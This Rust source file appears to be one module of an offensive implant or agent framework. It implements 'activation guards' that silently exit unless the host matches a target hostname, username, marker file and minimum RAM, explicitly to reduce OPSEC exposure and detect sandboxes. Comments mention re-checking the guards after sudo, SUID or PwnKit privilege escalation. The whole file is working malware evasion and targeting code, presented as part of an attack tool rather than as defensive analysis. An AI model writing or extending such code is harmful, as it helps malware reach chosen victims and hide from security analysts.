/// Activation guards — checked at startup before any network or disk activity.
/// Any unsatisfied guard causes an immediate silent exit, reducing OPSEC exposure.
///
/// Supported guards (injected as compile-time environment variables by the generator):
/// - GUARD_HOSTNAME      : only run on this hostname (read via libc::gethostname)
/// - GUARD_USERNAME      : only run as this user (read via libc::getpwuid)
/// - GUARD_FILE_EXISTS   : only run when this path exists (killswitch / marker file)
/// - GUARD_MIN_MEMORY_MB : exit if physical RAM is below this threshold (sandbox detection)
///
/// All guards are compile-time opt-in; unset guards add zero runtime overhead.

pub fn check_activation_guards() -> bool {
    // Each guard resolves its value in two steps:
    //   1. compile-time env var (GUARD_* injected by the build pipeline)
    //   2. embedded_config constant (set in embedded_config.rs by the generator)
    // This ensures that values written to embedded_config.rs are actually honoured
    // even when the corresponding build-time env var was not exported.

    // ── 1. Hostname guard ─────────────────────────────────────────────────────
    let guard_hostname = option_env!("GUARD_HOSTNAME")
        .map(|s| s.to_string())
        .unwrap_or_else(|| crate::embedded_config::guard_hostname());
    if !guard_hostname.is_empty() {
        let actual = get_hostname();
        if !actual.eq_ignore_ascii_case(&guard_hostname) {
            return false;
        }
    }

    // ── 2. Username guard ─────────────────────────────────────────────────────
    let guard_username = option_env!("GUARD_USERNAME")
        .map(|s| s.to_string())
        .unwrap_or_else(|| crate::embedded_config::guard_username());
    // Skip in an escalated image: the guard names the ORIGINAL landing user, but
    // the startup chain re-checks guards after sudo/SUID/PwnKit escalation execs
    // us as root — without this exemption every successfully-escalated agent
    // would immediately fail the "user" guard and silently exit.
    #[cfg(unix)]
    let escalated = std::env::var("_ELEVATED").is_ok() && unsafe { libc::geteuid() } == 0;
    #[cfg(not(unix))]
    let escalated = false;
    if !escalated && !guard_username.is_empty() {
        let actual = get_username();
        if !actual.eq_ignore_ascii_case(&guard_username) {
            return false;
        }
    }

    // ── 3. File-exists guard (killswitch / marker dual-use) ───────────────────
    let guard_file = option_env!("GUARD_FILE_EXISTS")
        .map(|s| s.to_string())
        .unwrap_or_else(|| crate::embedded_config::guard_file_exists());
    if !guard_file.is_empty() && !std::path::Path::new(&guard_file).exists() {
        return false;
    }

    // ── 4. Minimum memory guard ───────────────────────────────────────────────
    let guard_mem = option_env!("GUARD_MIN_MEMORY_MB")
        .map(|s| s.to_string())
        .unwrap_or_else(|| crate::embedded_config::guard_min_memory_mb());
    if let Ok(min_mb) = guard_mem.parse::<u64>() {
        if min_mb > 0 {
            let actual_mb = get_total_memory_mb();
            // If reading /proc/meminfo fails (returns 0), conservatively reject
            // to avoid running in heavily restricted / sandbox environments.
            if actual_mb == 0 || actual_mb < min_mb {
                return false;
            }
        }
    }

    true
}

// ─── Platform implementations ─────────────────────────────────────────────────

#[cfg(unix)]
fn get_hostname() -> String {
    let mut buf = [0u8; 256];
    let rc = unsafe { libc::gethostname(buf.as_mut_ptr() as *mut _, buf.len()) };
    if rc == 0 {
        let end = buf.iter().position(|&b| b == 0).unwrap_or(buf.len());
        return String::from_utf8_lossy(&buf[..end]).to_string();
    }
    std::env::var("HOSTNAME")
        .or_else(|_| std::env::var("COMPUTERNAME"))
        .unwrap_or_default()
}

#[cfg(not(unix))]
fn get_hostname() -> String {
    std::env::var("COMPUTERNAME")
        .or_else(|_| std::env::var("HOSTNAME"))
        .unwrap_or_default()
}

#[cfg(unix)]
fn get_username() -> String {
    // B18：getpwuid 非线程安全（NSS 竞态）——改为直析 /etc/passwd，
    // 与 sysinfo.rs 同一手法；文件不存在/无匹配再退回环境变量。
    unsafe {
        let uid = libc::getuid();
        if let Ok(content) = std::fs::read_to_string("/etc/passwd") {
            for line in content.lines() {
                let f: Vec<&str> = line.split(':').collect();
                if f.len() >= 3 {
                    if let Ok(row_uid) = f[2].parse::<u32>() {
                        if row_uid == uid as u32 {
                            return f[0].to_string();
                        }
                    }
                }
            }
        }
    }
    std::env::var("USER")
        .or_else(|_| std::env::var("LOGNAME"))
        .unwrap_or_default()
}

#[cfg(not(unix))]
fn get_username() -> String {
    std::env::var("USERNAME")
        .or_else(|_| std::env::var("USER"))
        .unwrap_or_default()
}

/// Read total physical RAM from /proc/meminfo (MB). Returns 0 on failure.
#[cfg(unix)]
fn get_total_memory_mb() -> u64 {
    if let Ok(content) = std::fs::read_to_string("/proc/meminfo") {
        for line in content.lines() {
            if line.starts_with("MemTotal:") {
                if let Some(kb_str) = line.split_whitespace().nth(1) {
                    if let Ok(kb) = kb_str.parse::<u64>() {
                        return kb / 1024;
                    }
                }
                break;
            }
        }
    }
    0
}

#[cfg(not(unix))]
fn get_total_memory_mb() -> u64 {
    // Use GlobalMemoryStatusEx to read physical RAM on Windows.
    #[cfg(windows)]
    {
        use std::mem;
        #[repr(C)]
        struct MemoryStatusEx {
            dw_length: u32,
            dw_memory_load: u32,
            ull_total_phys: u64,
            ull_avail_phys: u64,
            ull_total_page_file: u64,
            ull_avail_page_file: u64,
            ull_total_virtual: u64,
            ull_avail_virtual: u64,
            ull_avail_extended_virtual: u64,
        }
        extern "system" {
            fn GlobalMemoryStatusEx(lpBuffer: *mut MemoryStatusEx) -> i32;
        }
        let mut ms = MemoryStatusEx {
            dw_length: mem::size_of::<MemoryStatusEx>() as u32,
            dw_memory_load: 0,
            ull_total_phys: 0,
            ull_avail_phys: 0,
            ull_total_page_file: 0,
            ull_avail_page_file: 0,
            ull_total_virtual: 0,
            ull_avail_virtual: 0,
            ull_avail_extended_virtual: 0,
        };
        let ok = unsafe { GlobalMemoryStatusEx(&mut ms) };
        if ok != 0 {
            return ms.ull_total_phys / (1024 * 1024);
        }
    }
    0
}
